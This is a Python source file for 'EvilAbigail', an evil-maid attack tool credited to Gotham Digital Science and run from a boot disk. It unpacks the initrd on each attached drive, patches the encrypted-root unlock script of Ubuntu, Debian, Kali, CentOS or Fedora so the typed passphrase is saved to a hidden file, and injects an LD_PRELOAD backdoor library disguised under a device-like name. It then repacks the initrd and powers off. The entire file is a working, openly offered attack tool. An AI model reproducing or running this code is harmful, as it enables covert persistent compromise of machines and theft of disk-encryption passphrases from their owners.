import os
import sys
import glob
import re
import shutil
import subprocess
import curses

if os.getuid():
    sys.exit("Please run as root")

system = lambda x:subprocess.call(x, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE)

DEBIANPRELOADCOMMAND = """
cp /{INITRDFILENAME} {ROOT}/{FILENAME}
export LD_PRELOAD=/{FILENAME}
\\1
"""
CENTOSPRELOADCOMMAND = """\\1
ExecStartPre=-/bin/mount -o remount,rw /{ROOT}/
ExecStartPre=-/bin/cp /{INITRDFILENAME} /{ROOT}/{FILENAME}"""

def CENTOSBACKDOOR(settings):
    os.remove("init")
    with open("init", "w") as init:
        init.write("#!/bin/bash\nexport LD_PRELOAD=/{INITRDFILENAME}\nexec /usr/lib/systemd/systemd\n".format(**settings))
    os.chmod('init', 0777)

config = {
        "Ubuntu" : { # 14.04.3
                "IDENTIFIER" : "grep lvm=ubuntu conf/conf.d/cryptroot",

                "PRELOADFILE" : "init",
                "PRELOADPRE" : "(# Chain to real filesystem)",
                "PRELOADPOST" : DEBIANPRELOADCOMMAND,

                "PWFILE" : "scripts/local-top/cryptroot",
                "PWPRE" : "(\\$cryptkeyscript \"\\$cryptkey\" \\|)",
                "PWPOST" : "\\1(read P; echo -ne \\\\\\\\x00$P >> /{INITRDFILENAME}; echo -n $P)| ",

                "ROOT" : "${rootmnt}",
                "FILENAME" : "/dev/hda1",
                "INITRDFILENAME" : "hda1"
            },
        "Debian" : { # 8.2.0
                "IDENTIFIER" : "grep lvm=debian conf/conf.d/cryptroot",

                "PRELOADFILE" : "init",
                "PRELOADPRE" : "(# Chain to real filesystem)",
                "PRELOADPOST" : DEBIANPRELOADCOMMAND,

                "PWFILE" : "scripts/local-top/cryptroot",
                "PWPRE" : "(\\$cryptkeyscript \"\\$cryptkey\" \\|)",
                "PWPOST" : "\\1(read P; echo -ne \\\\\\\\x00$P >> /{INITRDFILENAME}; echo -n $P)| ",

                "ROOT" : "${rootmnt}",
                "FILENAME" : "/dev/hda1",
                "INITRDFILENAME" : "hda1"
            },
        "DRACUT" : { # pseudo OS, causes it to unpack the appended cpio image
                "IDENTIFIER" : "ls kernel/x86/microcode/GenuineIntel.bin"
            },
        "Kali" : { # 2.0
                "IDENTIFIER" : "grep lvm=kali conf/conf.d/cryptroot",

                "PRELOADFILE" : "init",
                "PRELOADPRE" : "(# Chain to real filesystem)",
                "PRELOADPOST" : DEBIANPRELOADCOMMAND,

                "PWFILE" : "scripts/local-top/cryptroot",
                "PWPRE" : "(\\$cryptkeyscript \"\\$cryptkey\" \\|)",
                "PWPOST" : "\\1(read P; echo -ne \\\\\\\\x00$P >> /{INITRDFILENAME}; echo -n $P)| ",

                "ROOT" : "${rootmnt}",
                "FILENAME" : "/dev/hda1",
                "INITRDFILENAME" : "hda1"
            },
        "CentOS" : { # 7
                "IDENTIFIER" : "grep CentOS etc/initrd-release",

                "PRELOADFILE" : "usr/lib/systemd/system/initrd-switch-root.service",
                "PRELOADPRE" : "(\[Service\])",
                "PRELOADPOST" : CENTOSPRELOADCOMMAND,

                "ENVFILE" : "etc/systemd/system.conf",
                "ENVPRE" : "#DefaultEnvironment=",
                "ENVPOST" : "DefaultEnvironment=LD_PRELOAD=/hda1",

                "ROOT" : "/sysroot/",
                "FILENAME" : "/usr/lib/lblinux.so.1",
                "INITRDFILENAME" : "hda1",
                "FUNCTIONS" : [CENTOSBACKDOOR]
            },
        "Fedora" : { # 23
                "IDENTIFIER" : "grep Fedora etc/initrd-release",

                "PRELOADFILE" : "usr/lib/systemd/system/initrd-switch-root.service",
                "PRELOADPRE" : "(\[Service\])",
                "PRELOADPOST" : CENTOSPRELOADCOMMAND,

                "ENVFILE" : "etc/systemd/system.conf",
                "ENVPRE" : "#DefaultEnvironment=",
                "ENVPOST" : "DefaultEnvironment=LD_PRELOAD=/hda1",

                "ROOT" : "/sysroot/",
                "FILENAME" : "/usr/lib/lblinux.so.1",
                "INITRDFILENAME" : "hda1",
                "FUNCTIONS" : [CENTOSBACKDOOR]
            }
        }

banner = """
 _____       _ _    _    _     _             _ _ 
| ____|_   _(_) |  / \  | |__ (_) __ _  __ _(_) |
|  _| \ \ / / | | / _ \ | '_ \| |/ _` |/ _` | | |
| |___ \ V /| | |/ ___ \| |_) | | (_| | (_| | | |
|_____| \_/ |_|_/_/   \_\_.__/|_|\__, |\__,_|_|_|
                                 |___/           
"""
copyrightlhs = "Copyright Gotham Digital Science"
copyrightrhs = "2015"
url = "https://github.com/GDSSecurity/EvilAbigail"


class UI:
    """
    NCurses based UI for the EvilAbigail iso
    """
    def __init__(self):
        """
        Setup the main screen, progress bars and logging box
        """
        self.screen = curses.initscr()
        curses.curs_set(0)

        curses.start_color()
        curses.init_pair(1, curses.COLOR_RED, curses.COLOR_BLACK)
        curses.init_pair(2, curses.COLOR_GREEN, curses.COLOR_BLACK)
        curses.init_pair(3, curses.COLOR_MAGENTA, curses.COLOR_BLACK)
        curses.init_pair(4, curses.COLOR_CYAN, curses.COLOR_BLACK)
        curses.init_pair(5, curses.COLOR_BLUE, curses.COLOR_BLACK)
        curses.init_pair(6, curses.COLOR_YELLOW, curses.COLOR_BLACK)

        self.height, self.width = self.screen.getmaxyx()
        self.screen.border()

        self.preptotal()
        self.prepcurrent()
        self.preplog()
        self.banner()
        self.sig()

        self.drives = len(glob.glob("/dev/sd?1"))
        self.donedrives = 0
        self.prevprogress = 0
        self.loglines = []
        self.idx = 1

    def banner(self):
        """
        Print the above banner and copyight notice
        """
        bannerlines = banner.split('\n')
        for idx, line in enumerate(bannerlines):
            self.screen.addstr(2+idx, 1, line.center(self.width-2), curses.color_pair(3))
        start = bannerlines[2].center(self.width-2).index('|')+1
        self.screen.addstr(1+idx, start, copyrightlhs, curses.color_pair(1))
        self.screen.addstr(1+idx, start+len(copyrightlhs)+7, copyrightrhs, curses.color_pair(1))
        self.screen.addstr(2+idx, start, url.rjust(len(bannerlines[2])), curses.color_pair(4))

    def sig(self):
        """
        Print author signature
        """
        self.sig = self.screen.subwin((self.height/2)-6, (self.width-2)/2, (self.height/2)+6, ((self.width-2)/2)+1)
        self.sig.border()
        self.sig.addstr(1, 1, "Evil Abigail".center(((self.width-2)/2)-2), curses.color_pair(6))
        self.sig.addstr(2, 1, "Rory McNamara".center(((self.width-2)/2)-2), curses.color_pair(6))
        self.sig.addstr(3, 1, "rmcnamara@gdssecurity.com".center(((self.width-2)/2)-2), curses.color_pair(6))

    def preptotal(self):
        """
        Draw the total progress bar
        """
        self.totalbar = self.screen.subwin(3, (self.width-2)/2, (self.height/2), ((self.width-2)/2)+1)
        self.totalbar.erase()
        self.totalbar.border()
        self.screen.addstr((self.height/2), ((self.width-2)/2)+4, "Total Progress")

    def prepcurrent(self):
        """
        Draw the current progress bar
        """
        self.currentbar = self.screen.subwin(3, (self.width-2)/2, (self.height/2)+3, ((self.width-2)/2)+1)
        self.currentbar.erase()
        self.currentbar.border()
        self.screen.addstr((self.height/2)+3, ((self.width-2)/2)+4, "Current Drive Progress")

    def preplog(self):
        """
        Draw the logging window
        """
        self.log = self.screen.subwin((self.height/2), (self.width-2)/2, self.height/2, 1)
        self.log.erase()
        self.log.border()
        self.screen.addstr((self.height/2), 4, "Log")

    def logger(self, line, status, continuing = False):
        """
        Log a line to the logging window. Autoscrolls
        A progress of 1.0 will fill the current bar accordingly (useful for 'continue')
        Auto splits and indents long lines
        """
        statuses = {
            "ERROR": curses.color_pair(1),
            "INFO": curses.color_pair(2)
        }
        if status == "ERROR" and not continuing:
            progress = 1.0
        else:
            progress = self.idx/self.items
        self.idx += 1
        first = True
        while line:
            if first:
                first = False
                self.loglines.append((line[:37], status))
                line = line[37:]
            else:
                self.loglines.append(('  '+line[:35], status))
                line = line[35:]
        self.preplog()
        for idx, line in enumerate(self.loglines[-((self.height/2)-3):]):
            self.log.addstr(idx+1, 1, line[0], statuses[line[1]])
        if progress:
            self.plot(progress)
        self.refresh()

    def nextdrive(self, items):
        """
        Signifies the start of the next drive for the current progress bar
        Items is how many logging evens we expect to see on the main path
        """
        self.idx = 1
        self.items = float(items)

    def incritems(self, items):
        """
        Allows adding to how many steps we expect to see
        For branch based differences
        """
        self.items += items

    def plot(self, progress):
        """
        Actually fill the progress bars accordingly
        """
        if progress < self.prevprogress:
            self.donedrives += 1
        self.prevprogress = progress

        progress = progress + self.donedrives
        totalbar = int((progress/self.drives)*((self.width-2)/2))
        currentbar = int(progress*((self.width-2)/2)) % (self.width/2)

        self.preptotal()
        self.prepcurrent()

        self.totalbar.addstr(1, 1, "-"*(totalbar-2), curses.color_pair(2))
        self.currentbar.addstr(1, 1, "-"*(currentbar-2), curses.color_pair(2))

        self.refresh()

    def refresh(self):
        """
        Refresh the screen in order
        """
        self.totalbar.refresh()
        self.currentbar.refresh()
        self.log.refresh()
        self.screen.refresh()

    def destroy(self):
        """
        Clear screen and exit
        """
        self.screen.erase()
        self.refresh()
        curses.endwin()

ui = UI()
ui.loglines.append(("Loading Drivers...", "INFO")) # bypass counting
for driver in glob.glob('/usr/local/lib/modules/3.16.6-tinycore/kernel/fs/*/*.ko.gz'):
    system("insmod {} 2>&1 >/dev/null".format(driver))

for disk in glob.glob("/dev/sd?1"):
    ui.nextdrive(6)
    ui.logger("Trying {}".format(disk), "INFO")
    system("mount {} /mnt".format(disk))

    grubcfgpath = False
    for root, dirs, files in os.walk('/mnt'):
        for file in files:
            if file == "grub.cfg":
                grubcfgpath = os.path.join(root,file)
    if not grubcfgpath or not os.path.isfile(grubcfgpath):
        ui.logger(" {} does not contain grub.cfg".format(disk), "ERROR")
        system("umount /mnt 2>/dev/null")
        continue

    with open(grubcfgpath, 'r') as grubcfg:
        data = grubcfg.read()
        initrdidx = re.findall('default="([^"]*)"', data)[1]
        if not initrdidx.isdigit():
            ui.incritems(1)
            ui.logger(" Find default failed. Using 0", "ERROR", continuing = True)
            initrdidx = 0
        else:
            initrdidx = int(initrdidx)
        initrd = re.findall("initrd\d*\s+([^\s]+)", data)[initrdidx]

    ui.logger(" Extracting initrd...", "INFO")
    with open("/mnt{}".format(initrd), "r") as fh:
        compressed = (fh.read(2) == "\x1f\x8b")
    system("{} /mnt{} 2>/dev/null| cpio -i 2>&1 >/dev/null".format("gunzip -c" if compressed else "cat", initrd))

    detectedOS = ""
    for OS in config:
        if not system(config[OS]["IDENTIFIER"]):
            detectedOS = OS
            break

    if not detectedOS:
        print error(" OS Detection Failed, Bailing")
        os.system('sh')
        system("umount /mnt 2>/dev/null")

    dracut = (detectedOS == "DRACUT")
    if dracut:
        ui.incritems(2)
        # unpack
        ui.logger(" dracut found, extracting real initrd", "INFO")
        system("rm -rf *")

        fh = open("/mnt{}".format(initrd), "r")
        data = fh.read()
        idx = data.index("TRAILER!!!")
        while data[idx:idx+2] != "\x1f\x8b":
            idx += 1
        system("dd if=/mnt{} bs={} skip=1 | gunzip -c | cpio -i 2>&1 >/dev/null".format(initrd, idx))

        ui.logger(" Redetecting OS...", "INFO")
        detectedOS = ""
        for OS in config:
            if not system(config[OS]["IDENTIFIER"]):
                detectedOS = OS
                break

    ui.logger(" OS: {}".format(detectedOS), "INFO")
    ui.logger(" Backdooring initrd...", "INFO")
    if os.path.isfile(config[detectedOS]["INITRDFILENAME"]):
        ui.logger("Already backdoored", "ERROR")
        continue

    shutil.copy('/hda1', config[detectedOS]["INITRDFILENAME"])

    for file in [key for key in config[detectedOS].keys() if key.endswith('FILE')]:
        fname = config[detectedOS][file]
        pre = config[detectedOS][file[:-4] + "PRE"].format(**config[detectedOS])
        post = config[detectedOS][file[:-4] + "POST"].format(**config[detectedOS])
        with open(fname, "r") as fh:
            data = fh.read()
            data = re.sub(pre, post, data)
        with open(fname, "w") as fh:
            fh.write(data)
    for function in config[detectedOS].get("FUNCTIONS", []):
        function(config[detectedOS])
    ui.logger(" Packing initrd...", "INFO")
    if dracut:
        system("find . | cpio -o -H newc | gzip | dd bs={} seek=1 of=/mnt{}".format(idx, initrd))
    else:
        system("find . | cpio -o -H newc | gzip > /mnt{}".format(initrd))

    system("umount /mnt 2>&1 >/dev/null")
    ui.logger(" Done {}".format(disk), "INFO")
ui.destroy()
system("poweroff")
